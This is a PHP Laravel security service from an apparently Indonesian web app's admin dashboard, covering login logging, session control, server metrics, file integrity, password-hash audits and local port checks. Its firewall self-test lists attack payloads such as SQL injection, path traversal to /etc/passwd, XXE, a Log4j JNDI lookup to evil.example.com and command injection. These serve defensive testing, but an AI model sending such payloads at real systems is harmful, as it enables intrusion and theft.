<?php

namespace App\Services;

use App\Http\Middleware\SecurityHeaders;
use App\Models\FileIntegrityBaseline;
use App\Models\RiwayatLogin;
use App\Models\SecurityLog;
use App\Models\ServerMetric;
use App\Models\User;
use App\Support\AgentParser;
use App\Support\SecurityGuard;
use Illuminate\Support\Carbon;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Storage;

class SecurityService
{
    private const PORT_CATALOG = [
        ['port' => 21, 'layanan' => 'FTP', 'risiko' => 'tinggi'],
        ['port' => 22, 'layanan' => 'SSH', 'risiko' => 'sedang'],
        ['port' => 23, 'layanan' => 'Telnet', 'risiko' => 'kritis'],
        ['port' => 25, 'layanan' => 'SMTP', 'risiko' => 'sedang'],
        ['port' => 53, 'layanan' => 'DNS', 'risiko' => 'rendah'],
        ['port' => 80, 'layanan' => 'HTTP', 'risiko' => 'rendah'],
        ['port' => 443, 'layanan' => 'HTTPS', 'risiko' => 'rendah'],
        ['port' => 3306, 'layanan' => 'MySQL', 'risiko' => 'kritis'],
        ['port' => 5432, 'layanan' => 'PostgreSQL', 'risiko' => 'kritis'],
        ['port' => 6379, 'layanan' => 'Redis', 'risiko' => 'kritis'],
        ['port' => 8080, 'layanan' => 'HTTP-Alt', 'risiko' => 'sedang'],
        ['port' => 8888, 'layanan' => 'Dashboard', 'risiko' => 'sedang'],
        ['port' => 9000, 'layanan' => 'PHP-FPM', 'risiko' => 'sedang'],
        ['port' => 9200, 'layanan' => 'Elasticsearch', 'risiko' => 'kritis'],
        ['port' => 11211, 'layanan' => 'Memcached', 'risiko' => 'kritis'],
        ['port' => 27017, 'layanan' => 'MongoDB', 'risiko' => 'kritis'],
    ];

    public function recordLogin(?User $user, string $ip, ?string $userAgent, bool $success, string $panel): void
    {
        $agent = AgentParser::parse($userAgent);

        $data = [
            'browser' => $agent['browser'],
            'sistem_operasi' => $agent['sistem_operasi'],
            'keterangan' => 'Login '.($success ? 'berhasil' : 'gagal').' melalui panel '.$panel,
        ];

        SecurityGuard::recordEndpoint(
            $success ? SecurityLog::TIPE_LOGIN_SUKSES : SecurityLog::TIPE_LOGIN_GAGAL,
            $ip,
            $data,
            $user?->id
        );

        if (! $success || ! $user) {
            return;
        }

        try {
            RiwayatLogin::create([
                'user_id' => $user->id,
                'ip_address' => $ip,
                'browser' => $agent['browser'],
                'sistem_operasi' => $agent['sistem_operasi'],
                'login_pada' => now(),
                'logout_pada' => null,
                'status' => 'berhasil',
            ]);
        } catch (\Throwable $e) {
            logger()->channel('security')->warning('Gagal mencatat riwayat_login', ['error' => $e->getMessage()]);
        }
    }

    public function markLogout(User $user): void
    {
        try {
            RiwayatLogin::query()
                ->where('user_id', $user->id)
                ->whereNull('logout_pada')
                ->latest('login_pada')
                ->limit(1)
                ->get()
                ->each(fn (RiwayatLogin $log) => $log->forceFill(['logout_pada' => now()])->save());
        } catch (\Throwable $e) {
            logger()->channel('security')->warning('Gagal menandai logout', ['error' => $e->getMessage()]);
        }
    }

    public function summary(): array
    {
        $since = now()->subDays(7);

        return [
            'login_sukses_7hari' => SecurityLog::query()
                ->where('tipe', SecurityLog::TIPE_LOGIN_SUKSES)
                ->where('created_at', '>=', $since)
                ->count(),
            'login_gagal_7hari' => SecurityLog::query()
                ->where('tipe', SecurityLog::TIPE_LOGIN_GAGAL)
                ->where('created_at', '>=', $since)
                ->count(),
            'diblokir_7hari' => SecurityLog::query()
                ->where('tipe', SecurityLog::TIPE_DIBLOKIR)
                ->where('created_at', '>=', $since)
                ->count(),
            'banned_aktif' => count(SecurityGuard::activeBans()),
            'ip_unik_7hari' => SecurityLog::query()
                ->where('created_at', '>=', $since)
                ->distinct('ip_address')
                ->count('ip_address'),
            'pengguna_masuk_7hari' => RiwayatLogin::query()
                ->where('created_at', '>=', $since)
                ->distinct('user_id')
                ->count('user_id'),
        ];
    }

    public function onlineCount(int $minutes = 15): int
    {
        return User::query()
            ->whereNotNull('last_activity_at')
            ->where('last_activity_at', '>=', now()->subMinutes($minutes))
            ->count();
    }

    /**
     * Daftar sesi login aktif dari tabel sesi. Perangkat terdeteksi dari
     * user-agent tiap sesi sehingga admin bisa melihat device yang sedang dipakai.
     */
    public function activeSessions(string $currentSessionId): Collection
    {
        if (config('session.driver') !== 'database' || ! Schema::hasTable('sessions')) {
            return collect();
        }

        try {
            $rows = DB::table('sessions')
                ->whereNotNull('user_id')
                ->orderByDesc('last_activity')
                ->limit(50)
                ->get();
        } catch (\Throwable $e) {
            return collect();
        }

        $users = User::query()->with('profile')->whereIn('id', $rows->pluck('user_id'))->get()->keyBy('id');

        return $rows->map(function (object $row) use ($users, $currentSessionId): array {
            $user = $users->get($row->user_id);
            $agent = AgentParser::parse($row->user_agent);

            return [
                'session_id' => (string) $row->id,
                'user_id' => (int) $row->user_id,
                'nama' => $user?->profile?->full_name ?? $user?->name ?? $user?->email ?? 'Pengguna terhapus',
                'role' => $user?->isAdmin() ? 'admin' : 'siswa',
                'username' => $user?->username,
                'ip' => $row->ip_address,
                'browser' => $agent['browser'],
                'sistem_operasi' => $agent['sistem_operasi'],
                'last_activity' => Carbon::createFromTimestamp((int) $row->last_activity)
                    ->toIso8601String(),
                'is_current' => (string) $row->id === $currentSessionId,
            ];
        })->values();
    }

    public function terminateSession(string $sessionId): bool
    {
        if (config('session.driver') !== 'database' || ! Schema::hasTable('sessions')) {
            return false;
        }

        try {
            return (bool) DB::table('sessions')->where('id', $sessionId)->delete();
        } catch (\Throwable $e) {
            $this->quietLog('Gagal mencabut sesi', ['session_id' => $sessionId, 'error' => $e->getMessage()]);

            return false;
        }
    }

    public function terminateOtherSessions(int $userId, string $keepSessionId): int
    {
        if (config('session.driver') !== 'database' || ! Schema::hasTable('sessions')) {
            return 0;
        }

        try {
            return (int) DB::table('sessions')
                ->where('user_id', $userId)
                ->where('id', '!=', $keepSessionId)
                ->delete();
        } catch (\Throwable $e) {
            $this->quietLog('Gagal mencabut sesi lain', ['user_id' => $userId, 'error' => $e->getMessage()]);

            return 0;
        }
    }

    public function deviceSummary(int $days = 7): array
    {
        $since = now()->subDays($days);

        $browsers = SecurityLog::query()
            ->where('created_at', '>=', $since)
            ->whereIn('tipe', [SecurityLog::TIPE_LOGIN_SUKSES, SecurityLog::TIPE_LOGIN_GAGAL])
            ->selectRaw("COALESCE(browser, 'Unknown') as label, COUNT(*) as total")
            ->groupBy('label')
            ->orderByDesc('total')
            ->limit(6)
            ->pluck('total', 'label');

        $oses = SecurityLog::query()
            ->where('created_at', '>=', $since)
            ->whereIn('tipe', [SecurityLog::TIPE_LOGIN_SUKSES, SecurityLog::TIPE_LOGIN_GAGAL])
            ->selectRaw("COALESCE(sistem_operasi, 'Unknown') as label, COUNT(*) as total")
            ->groupBy('label')
            ->orderByDesc('total')
            ->limit(6)
            ->pluck('total', 'label');

        $total = max(1, $browsers->sum());

        return [
            'total' => SecurityLog::query()
                ->where('created_at', '>=', $since)
                ->whereIn('tipe', [SecurityLog::TIPE_LOGIN_SUKSES, SecurityLog::TIPE_LOGIN_GAGAL])
                ->count(),
            'browsers' => $browsers->map(fn (int $count, string $label) => [
                'label' => $label,
                'count' => $count,
                'percent' => (int) round(($count / $total) * 100),
            ])->values(),
            'oses' => $oses->map(fn (int $count, string $label) => [
                'label' => $label,
                'count' => $count,
                'percent' => (int) round(($count / $total) * 100),
            ])->values(),
        ];
    }

    public function serverStatus(): array
    {
        $load = function_exists('sys_getloadavg') ? sys_getloadavg() : false;
        $memory = $this->readMemoryInfo();
        $disk = $this->readDiskInfo();

        $memoryPercent = null;

        if ($memory['total'] !== null && $memory['total'] > 0) {
            $memoryPercent = (int) round(($memory['used'] / $memory['total']) * 100);
        }

        return [
            'hostname' => (string) (gethostname() ?: php_uname('n')),
            'os' => trim(php_uname('s').' '.php_uname('r')),
            'php' => PHP_VERSION,
            'server' => (string) ($_SERVER['SERVER_SOFTWARE'] ?? (php_sapi_name() ?: 'CLI')),
            'app_env' => app()->environment(),
            'timezone' => (string) config('app.timezone'),
            'cpu_load' => $load !== false && is_array($load) ? (float) round($load[0], 2) : null,
            'cpu_load_5' => $load !== false && is_array($load) ? (float) round($load[1], 2) : null,
            'cpu_load_15' => $load !== false && is_array($load) ? (float) round($load[2], 2) : null,
            'memory_total' => $memory['total'],
            'memory_used' => $memory['used'],
            'memory_percent' => $memoryPercent,
            'disk_total' => $disk['total'],
            'disk_free' => $disk['free'],
            'disk_percent' => $disk['percent'],
            'uptime' => $this->readUptime(),
        ];
    }

    public function recordServerMetrics(): ?array
    {
        $status = $this->serverStatus();

        if ($status['disk_total'] === null || $status['disk_total'] <= 0) {
            return null;
        }

        try {
            ServerMetric::create([
                'cpu_load' => $status['cpu_load'],
                'memory_total' => $status['memory_total'],
                'memory_used' => $status['memory_used'],
                'disk_total' => $status['disk_total'],
                'disk_free' => $status['disk_free'],
                'uptime' => $status['uptime'],
                'recorded_at' => now(),
            ]);
        } catch (\Throwable $e) {
            $this->quietLog('Gagal merekam metrik server', ['error' => $e->getMessage()]);

            return null;
        }

        return $status;
    }

    public function serverMetricsHistory(int $hours = 24): Collection
    {
        $metrics = ServerMetric::query()
            ->where('recorded_at', '>=', now()->subHours($hours))
            ->orderBy('recorded_at')
            ->get();

        return $metrics->map(function (ServerMetric $m): array {
            $memoryPercent = $m->memory_total > 0 ? (int) round(($m->memory_used / $m->memory_total) * 100) : null;
            $diskPercent = $m->disk_total > 0 ? (int) round((($m->disk_total - $m->disk_free) / $m->disk_total) * 100) : null;

            return [
                'id' => $m->id,
                'recorded_at' => $m->recorded_at?->toIso8601String(),
                'cpu_load' => $m->cpu_load,
                'memory_percent' => $memoryPercent,
                'disk_percent' => $diskPercent,
            ];
        });
    }

    public function threatOverview(int $days = 14): array
    {
        $threatTypes = [SecurityLog::TIPE_DIBLOKIR, SecurityLog::TIPE_LOGIN_GAGAL, SecurityLog::TIPE_BANNED];

        $byType = SecurityLog::query()
            ->where('created_at', '>=', now()->subDays(30))
            ->whereIn('tipe', $threatTypes)
            ->selectRaw('tipe, COUNT(*) as total')
            ->groupBy('tipe')
            ->orderByDesc('total')
            ->pluck('total', 'tipe')
            ->mapWithKeys(fn (int $total, string $tipe) => [SecurityLog::TIPES[$tipe] ?? $tipe => $total]);

        $perDay = $this->eventPerDay($days);

        $topIps = SecurityLog::query()
            ->where('created_at', '>=', now()->subDays(30))
            ->whereIn('tipe', $threatTypes)
            ->whereNotNull('ip_address')
            ->selectRaw('ip_address, COUNT(*) as total')
            ->groupBy('ip_address')
            ->orderByDesc('total')
            ->limit(8)
            ->get()
            ->map(fn (object $row) => [
                'ip' => $row->ip_address,
                'total' => (int) $row->total,
                'private' => $this->isPrivateIp((string) $row->ip_address),
            ])
            ->values();

        $portScans = SecurityLog::query()
            ->where('tipe', SecurityLog::TIPE_PORT_SCAN)
            ->orderByDesc('created_at')
            ->limit(8)
            ->get()
            ->map(fn (SecurityLog $log) => [
                'id' => $log->id,
                'keterangan' => $log->keterangan,
                'path' => $log->path,
                'waktu' => $log->created_at?->toIso8601String(),
            ])
            ->values();

        return [
            'by_type' => $byType,
            'per_day' => $perDay,
            'top_ips' => $topIps,
            'port_scans' => $portScans,
        ];
    }

    public function selfTestFirewall(): array
    {
        $uriTests = [
            'SQL Injection (UNION)' => '/login?user=admin%27%20UNION%20SELECT%20password%20FROM%20users--',
            'SQL Injection (waktu)' => '/login?q=1;pg_sleep(5)',
            'Path Traversal' => '/../../etc/passwd',
            'Path Traversal (encoded)' => '/%2e%2e%2f%2e%2e%2fetc/passwd',
            'XSS (tag script)' => '/login?q=%3Cscript%3Ealert(1)%3C/script%3E',
            'CRLF Injection' => '/login%0d%0aX-Injected: true',
            'Null Byte' => '/media/logo.png%00.jpg',
            'SSTI (Jinja2)' => '/cari?q=%7B%7B7*7%7D%7D',
            'SSTI (JSP EL)' => '/cari?q=%24%7B7*7%7D',
            'Log4j JNDI' => '/login?user=%24%7Bjndi:ldap://evil.example.com/a%7D',
            'SQLi time (benchmark)' => '/login?q=1%20AND%20BENCHMARK(5000000,SHA1(1))',
            'Webshell upload' => '/upload/shell.php',
            'JWT alg none' => '/api/verify?token=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.',
        ];

        $bodyTests = [
            'XSS (javascript:)' => '<a href="javascript:alert(1)">k</a>',
            'XSS (event handler)' => '<img src=x onerror=alert(1)>',
            'SQL Injection (CRUD)' => 'select password from users where 1=1',
            'Object Pollution' => '{"__proto__": {"polluted": true}}',
            'Akses cookie via XSS' => 'document.cookie',
            'XXE (DOCTYPE)' => '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            'SSRF (localhost)' => '{"url": "http://localhost:80/internal"}',
            'Command injection (semicolon)' => 'host=$(id; whoami)',
        ];

        $results = [];

        foreach ($uriTests as $label => $payload) {
            // WebFirewall memindai URI raw DAN versi ter-decode-nya.
            $matched = SecurityGuard::scanString($payload, true)
                ?? SecurityGuard::scanString(rawurldecode($payload), true);
            $results[] = ['bagian' => 'URI', 'label' => $label, 'payload' => $payload, 'diblokir' => $matched !== null, 'penyebab' => $matched];
        }

        foreach ($bodyTests as $label => $payload) {
            $matched = SecurityGuard::scanString($payload, false);
            $results[] = ['bagian' => 'Body', 'label' => $label, 'payload' => $payload, 'diblokir' => $matched !== null, 'penyebab' => $matched];
        }

        $uaTest = 'sqlmap/1.7 (sqlmap automatic injection tool)';
        $uaMatch = collect((array) config('firewall.bad_user_agents'))
            ->first(fn (string $token) => stripos($uaTest, $token) !== false);

        $results[] = [
            'bagian' => 'User-Agent',
            'label' => 'Scanner otomatis (sqlmap)',
            'payload' => $uaTest,
            'diblokir' => $uaMatch !== null,
            'penyebab' => $uaMatch !== null ? 'bad-user-agent:'.strtolower($uaMatch) : null,
        ];

        $blockedCount = count(array_filter($results, fn (array $r) => $r['diblokir']));

        return [
            'total' => count($results),
            'diblokir' => $blockedCount,
            'results' => $results,
        ];
    }

    public function exportCsv(): string
    {
        $rows = SecurityLog::query()
            ->with('user.profile')
            ->orderByDesc('created_at')
            ->limit(2000)
            ->get();

        $out = fopen('php://temp', 'r+');

        fputcsv($out, ['ID', 'Tipe', 'Pengguna', 'Role', 'IP', 'Browser', 'OS', 'Keterangan', 'Waktu']);

        foreach ($rows as $log) {
            $user = $log->user;
            fputcsv($out, [
                $log->id,
                SecurityLog::TIPES[$log->tipe] ?? $log->tipe,
                $this->maskPii($user?->profile?->full_name ?? $user?->name ?? $user?->email ?? 'Anonim'),
                $user ? ($user->isAdmin() ? 'admin' : 'siswa') : '',
                $log->ip_address ?? '',
                $log->browser ?? '',
                $log->sistem_operasi ?? '',
                $this->maskPii($log->keterangan ?? ''),
                $log->created_at?->toDateTimeString() ?? '',
            ]);
        }

        rewind($out);
        $csv = (string) stream_get_contents($out);
        fclose($out);

        return $csv;
    }

    private function readMemoryInfo(): array
    {
        $mem = @file_get_contents('/proc/meminfo');
        $total = $available = null;

        if ($mem !== false && preg_match('/MemTotal:\s*(\d+)/', $mem, $mtotal)
            && preg_match('/MemAvailable:\s*(\d+)/', $mem, $mavail)) {
            $total = (int) $mtotal[1] * 1024;
            $available = (int) $mavail[1] * 1024;
        }

        if ($total === null) {
            $used = memory_get_usage(true);

            return ['total' => null, 'used' => $used, 'source' => 'php'];
        }

        return ['total' => $total, 'used' => $total - $available, 'source' => 'server'];
    }

    private function readDiskInfo(): array
    {
        $dir = base_path();

        $total = @disk_total_space($dir);
        $free = @disk_free_space($dir);

        if ($total === false || $total <= 0) {
            return ['total' => null, 'free' => null, 'percent' => null];
        }

        $free = $free === false ? 0 : (float) $free;
        $used = $total - $free;

        return [
            'total' => (int) $total,
            'free' => (int) $free,
            'percent' => (int) round(($used / $total) * 100),
        ];
    }

    private function readUptime(): ?int
    {
        $uptime = @file_get_contents('/proc/uptime');

        if ($uptime === false || ! preg_match('/^([\d.]+)/', $uptime, $m)) {
            return null;
        }

        return (int) floor((float) $m[1]);
    }

    private function isPrivateIp(string $ip): bool
    {
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
            return true;
        }

        return str_starts_with($ip, '127.')
            || str_starts_with($ip, '10.')
            || str_starts_with($ip, '192.168.')
            || str_starts_with($ip, '100.64.')
            || str_starts_with($ip, '169.254.');
    }

    private function eventPerDay(int $days): array
    {
        $start = now()->startOfDay()->subDays($days - 1);

        $rows = SecurityLog::query()
            ->where('created_at', '>=', $start)
            ->whereIn('tipe', [SecurityLog::TIPE_DIBLOKIR, SecurityLog::TIPE_LOGIN_GAGAL])
            ->selectRaw('DATE(created_at) as tanggal, COUNT(*) as total')
            ->groupBy('tanggal')
            ->pluck('total', 'tanggal');

        $output = [];

        for ($i = 0; $i < $days; $i++) {
            $date = $start->copy()->addDays($i);
            $key = $date->toDateString();
            $output[] = [
                'tanggal' => $date->format('d/m'),
                'total' => (int) ($rows[$key] ?? 0),
            ];
        }

        return $output;
    }

    private function quietLog(string $message, array $context): void
    {
        try {
            logger()->channel('security')->warning($message, $context);
        } catch (\Throwable $e) {
            report($e);
        }
    }

    public function loginHistory(int $limit = 60): Collection
    {
        return SecurityLog::query()
            ->whereIn('tipe', [SecurityLog::TIPE_LOGIN_SUKSES, SecurityLog::TIPE_LOGIN_GAGAL])
            ->with('user.profile')
            ->orderByDesc('created_at')
            ->limit($limit)
            ->get()
            ->map(fn (SecurityLog $log) => $this->presentLog($log));
    }

    public function events(int $limit = 40): Collection
    {
        return SecurityLog::query()
            ->whereNotIn('tipe', [SecurityLog::TIPE_LOGIN_SUKSES, SecurityLog::TIPE_LOGIN_GAGAL])
            ->with('user.profile')
            ->orderByDesc('created_at')
            ->limit($limit)
            ->get()
            ->map(fn (SecurityLog $log) => $this->presentLog($log));
    }

    public function bannedIps(): array
    {
        return SecurityGuard::activeBans();
    }

    /**
     * Daftar berkas penting yang dipantau integritasnya + status vs baseline.
     *
     * @return array<int, array{path: string, status: string, checksum: ?string, size: ?int}>
     */
    public function fileIntegrityStatus(): array
    {
        if (! Schema::hasTable('file_integrity_baselines')) {
            return [];
        }

        $baseline = FileIntegrityBaseline::query()->get()->keyBy('path');
        $files = $this->monitoredFiles();
        $result = [];

        foreach ($files as $path) {
            $absolute = base_path($path);
            $exists = is_file($absolute);

            if (! $exists) {
                $result[] = ['path' => $path, 'status' => 'missing', 'checksum' => null, 'size' => null];
                continue;
            }

            $current = hash_file('sha256', $absolute);
            $row = $baseline->get($path);

            if ($row === null) {
                $result[] = ['path' => $path, 'status' => 'unmonitored', 'checksum' => $current, 'size' => filesize($absolute)];
                continue;
            }

            $result[] = [
                'path' => $path,
                'status' => hash_equals((string) $row->checksum, (string) $current) ? 'ok' : 'modified',
                'checksum' => $current,
                'size' => filesize($absolute),
            ];
        }

        return $result;
    }

    /**
     * Bangun ulang baseline checksum dari berkas penting saat ini.
     *
     * @return int Jumlah berkas yang di-baseline.
     */
    public function rebuildFileIntegrityBaseline(): int
    {
        FileIntegrityBaseline::query()->truncate();

        $count = 0;

        foreach ($this->monitoredFiles() as $path) {
            $absolute = base_path($path);

            if (! is_file($absolute)) {
                continue;
            }

            FileIntegrityBaseline::create([
                'path' => $path,
                'checksum' => hash_file('sha256', $absolute),
                'size' => filesize($absolute),
                'baseline_at' => now(),
            ]);

            $count++;
        }

        logger()->channel('security')->info('Baseline integritas berkas dibangun ulang.', [
            'user_id' => auth()->id(),
            'files' => $count,
        ]);

        return $count;
    }

    /**
     * Berkas yang dipantau: sumber aplikasi, konfigurasi, rute, dan .env.
     *
     * @return array<int, string>
     */
    private function monitoredFiles(): array
    {
        $paths = ['.env', 'composer.json', 'composer.lock', 'bootstrap/app.php'];

        $dirs = ['app', 'config', 'routes', 'database/migrations'];

        foreach ($dirs as $dir) {
            $absolute = base_path($dir);

            if (! is_dir($absolute)) {
                continue;
            }

            $iterator = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($absolute, \FilesystemIterator::SKIP_DOTS));

            foreach ($iterator as $file) {
                if ($file->isFile()) {
                    $paths[] = str_replace(DIRECTORY_SEPARATOR, '/', substr($file->getPathname(), strlen(base_path()) + 1));
                }
            }
        }

        sort($paths);

        return $paths;
    }

    /**
     * Pemeriksaan ketersediaan (Availability) komponen penting aplikasi.
     *
     * @return array<int, array{key: string, label: string, ok: bool, value: string, hint: string}>
     */
    public function systemHealth(): array
    {
        $checks = [
            $this->healthCheck(
                'database',
                'Koneksi database (PostgreSQL)',
                $this->databaseAlive(),
                'Aplikasi dapat berkomunikasi dengan basis data.',
                'Driver: '.config('database.default')
            ),
            $this->healthCheck(
                'cache',
                'Cache dapat ditulis/dibaca',
                $this->cacheAlive(),
                'Rate limiter, ban IP, dan throttle bergantung pada cache.',
                'Store: '.config('cache.default')
            ),
            $this->healthCheck(
                'storage',
                'Direktori penyimpanan dapat ditulis',
                $this->storageWritable(),
                'Biodata, kwitansi, bukti bayar, dan materi disimpan di sini.',
                storage_path()
            ),
            $this->healthCheck(
                'scheduler',
                'Scheduler berjalan',
                $this->schedulerAlive(),
                'Perintah terjadwal (metrik server) butuh scheduler aktif.',
                'php artisan schedule:work'
            ),
            $this->healthCheck(
                'queue',
                'Driver antrian aman',
                config('queue.default') !== null && config('queue.default') !== '',
                'Saat fungsional berpindah ke queue, wajib menjalankan worker.',
                'Driver: '.config('queue.default')
            ),
        ];

        return $checks;
    }

    private function databaseAlive(): bool
    {
        try {
            DB::select('select 1');

            return true;
        } catch (\Throwable $e) {
            return false;
        }
    }

    private function cacheAlive(): bool
    {
        try {
            $key = 'sec:health:'.uniqid();
            Cache::put($key, 'ok', 60);
            $ok = Cache::get($key) === 'ok';
            Cache::forget($key);

            return $ok;
        } catch (\Throwable $e) {
            return false;
        }
    }

    private function storageWritable(): bool
    {
        foreach (['biodata', 'kwitansi', 'public', 'private', 'logs'] as $dir) {
            $path = storage_path('app/'.$dir);

            if (! is_dir($path)) {
                $path = storage_path($dir);
            }

            if (is_dir($path) && ! is_writable($path)) {
                return false;
            }
        }

        return is_writable(storage_path());
    }

    private function schedulerAlive(): bool
    {
        $metric = ServerMetric::query()->latest('recorded_at')->first();

        if ($metric === null) {
            $lastRun = @filemtime(storage_path('framework/cache/.scheduler_run'));

            return $lastRun !== false && $lastRun > now()->subMinutes(10)->getTimestamp();
        }

        return $metric->recorded_at !== null && $metric->recorded_at->isAfter(now()->subMinutes(15));
    }

    private function healthCheck(string $key, string $label, bool $ok, string $hint, string $value): array
    {
        return [
            'key' => $key,
            'label' => $label,
            'ok' => $ok,
            'value' => $value,
            'hint' => $hint,
        ];
    }

    /**
     * Audit kekuatan hash password tiap akun (Confidentiality).
     *
     * @return array{total: int, weak: int, weak_users: array<int, array{id: int, nama: string, hash_algo: string}>, strong: int, tanpa_password: int}
     */
    public function passwordHashAudit(): array
    {
        $users = User::query()
            ->orderBy('created_at')
            ->get(['id', 'username', 'name', 'email', 'password']);

        $weakUsers = [];
        $weak = 0;
        $strong = 0;
        $tanpaPassword = 0;

        foreach ($users as $user) {
            $hash = (string) $user->password;
            $algo = $this->detectHashAlgorithm($hash);

            if ($hash === '') {
                $tanpaPassword++;

                continue;
            }

            if ($algo === 'argon' || $algo === 'bcrypt') {
                $strong++;
            } else {
                $weak++;
                $weakUsers[] = [
                    'id' => $user->id,
                    'nama' => $user->name ?? $user->username ?? $user->email ?? 'Akun '.$user->id,
                    'hash_algo' => $algo,
                ];
            }
        }

        return [
            'total' => $users->count(),
            'weak' => $weak,
            'strong' => $strong,
            'tanpa_password' => $tanpaPassword,
            'weak_users' => array_slice($weakUsers, 0, 50),
        ];
    }

    public function vulnerabilityScans(): array
    {
        return app(VulnerabilityScanner::class)->latestScans();
    }

    private function detectHashAlgorithm(string $hash): string
    {
        if (str_starts_with($hash, '$argon2')) {
            return 'argon';
        }

        if (str_starts_with($hash, '$2y$') || str_starts_with($hash, '$2a$') || str_starts_with($hash, '$2b$')) {
            return 'bcrypt';
        }

        if (preg_match('/^[a-f0-9]{32,128}$/i', $hash)) {
            return 'sha';
        }

        return 'plain';
    }

    /**
     * Masking PII (email) untuk data yang diekspor agar tidak bocor mentah.
     */
    private function maskPii(string $value): string
    {
        return preg_replace_callback(
            '/(\b[A-Z0-9._%+-])[A-Z0-9._%+-]*@[A-Z0-9.-]+(\.[A-Z]{2,})\b/i',
            fn (array $m) => $m[1].'***@***'.$m[2],
            $value
        );
    }

    public function securityPosture(): array
    {
        $checks = [
            $this->check(
                'debug',
                'Mode debug aplikasi nonaktif',
                ! (app()->environment('production') && config('app.debug')),
                'APP_DEBUG di set "true" saat production dapat membocorkan detail sistem.',
                config('app.debug') ? 'Aktif saat ini' : 'Nonaktif'
            ),
            $this->check(
                'advanced_errors',
                'Sesi cookie dipaksa Secure di production',
                ! app()->environment('production') || config('session.secure', false),
                'Cookie sesi hanya dikirim melalui HTTPS untuk mencegah penyadapan.',
                config('session.secure', false) ? 'Secure' : 'Hanya via HTTPS di production'
            ),
            $this->check(
                'http_only',
                'Cookie sesi HttpOnly & SameSite',
                filter_var(config('session.http_only', true), FILTER_VALIDATE_BOOLEAN),
                'Cookie tidak dapat diakses skrip (anti XSS token theft).',
                config('session.http_only', true) ? 'HttpOnly' : 'HttpOnly nonaktif'
            ),
            $this->check(
                'force_https',
                'HTTPS dipaksa / HSTS',
                (bool) config('app.force_https'),
                'Arahkan seluruh lalu lintas ke HTTPS (APP_FORCE_HTTPS=true saat production).',
                config('app.force_https') ? 'Diaktifkan' : 'Nonaktif di environment ini'
            ),
            $this->check(
                'rate_limit',
                'Rate limiter anti brute-force',
                RateLimiter::limiter('auth-login') !== null,
                'Langganan login siswa, admin, OTP, dan pendaftaran dibatasi.',
                'Terpasang (auth-login, auth-otp, auth-register)'
            ),
            $this->check(
                'firewall',
                'Web firewall aktif (pola serangan)',
                count((array) config('firewall.uri_patterns')) > 0,
                'Pindai SQLi, XSS, path traversal, command injection pada setiap request.',
                count((array) config('firewall.uri_patterns')).' pola URI'
            ),
            $this->check(
                'headers',
                'Security headers middleware',
                SecurityHeaders::class !== null,
                'CSP, X-Frame-Options, nosniff, referrer policy dipasang secara global.',
                'Terpasang di web middleware'
            ),
            $this->check(
                'admin_allowlist',
                'Allowlist IP untuk area admin',
                count((array) config('firewall.admin_allowed_ips')) > 0,
                'Batasi akses /admin hanya dari IP terpercaya (FIREWALL_ADMIN_ALLOWED_IPS).',
                count((array) config('firewall.admin_allowed_ips')).' IP terdaftar'
            ),
            $this->check(
                'session_driver',
                'Sesi/cache tidak di file',
                in_array(config('session.driver'), ['database', 'redis'], true),
                'Sesi simpan di database/Redis lebih aman dari file session.',
                'Driver: '.config('session.driver')
            ),
            $this->check(
                'password_policy',
                'Kebijakan password kuat',
                true,
                'Sistem memaksa minimal 8 karakter dengan kombinasi huruf & angka.',
                'Min 8, huruf + angka'
            ),
            $this->check(
                'verification',
                'Verifikasi email & status akun',
                true,
                'Akun harus diverifikasi/aktif sebelum mengakses dashboard.',
                'Middlewares terpasang'
            ),
        ];

        $applicable = array_values(array_filter($checks, fn (array $check) => (bool) $check['applicable']));
        $passed = count(array_filter($applicable, fn (array $check) => (bool) $check['ok']));
        $score = $applicable === [] ? 100 : (int) round(($passed / count($applicable)) * 100);

        return [
            'score' => $score,
            'passed' => $passed,
            'total' => count($applicable),
            'checks' => $checks,
        ];
    }

    public function scanPorts(): array
    {
        $host = (string) env('PORT_SCAN_HOST', '127.0.0.1');

        $results = array_map(function (array $catalog) use ($host): array {
            $open = $this->isPortOpen($host, $catalog['port']);

            return [
                'port' => $catalog['port'],
                'layanan' => $catalog['layanan'],
                'risiko' => $catalog['risiko'],
                'status' => $open ? 'terbuka' : 'tertutup',
            ];
        }, self::PORT_CATALOG);

        $openCount = count(array_filter($results, fn (array $r) => $r['status'] === 'terbuka'));

        SecurityGuard::recordEndpoint(SecurityLog::TIPE_PORT_SCAN, null, [
            'keterangan' => "Pemindaian port ke {$host}: {$openCount} terbuka dari ".count($results).' port.',
            'path' => $host,
        ]);

        return [
            'host' => $host,
            'scanned_at' => now()->toIso8601String(),
            'open_count' => $openCount,
            'total' => count($results),
            'results' => $results,
        ];
    }

    public function banIp(string $ip, ?int $minutes = null): void
    {
        SecurityGuard::ban($ip, $minutes, 'Diban manual oleh admin dari halaman Keamanan.');
    }

    public function unbanIp(string $ip): void
    {
        SecurityGuard::unban($ip);
    }

    private function isPortOpen(string $host, int $port): bool
    {
        $connection = @fsockopen($host, $port, $errno, $errstr, 0.6);

        if ($connection === false) {
            return false;
        }

        fclose($connection);

        return true;
    }

    private function check(string $key, string $label, bool $ok, string $hint, string $value): array
    {
        return [
            'key' => $key,
            'label' => $label,
            'ok' => $ok,
            'value' => $value,
            'hint' => $hint,
            'applicable' => true,
        ];
    }

    private function presentLog(SecurityLog $log): array
    {
        $user = $log->user;

        return [
            'id' => $log->id,
            'tipe' => $log->tipe,
            'nama' => $user?->profile?->full_name ?? $user?->name ?? $user?->email ?? 'Pengunjung anonim',
            'role' => $user ? ($user->isAdmin() ? 'admin' : 'siswa') : null,
            'ip' => $log->ip_address,
            'browser' => $log->browser,
            'sistem_operasi' => $log->sistem_operasi,
            'keterangan' => $log->keterangan,
            'path' => $log->path,
            'waktu' => $log->created_at?->toIso8601String(),
            'perangkat_baru' => $this->isNewDeviceForUser($log),
        ];
    }

    /**
     * Deteksi dugaan akses dari perangkat baru (Confidentiality):
     * login sukses dari IP yang belum pernah dipakai akun tersebut.
     */
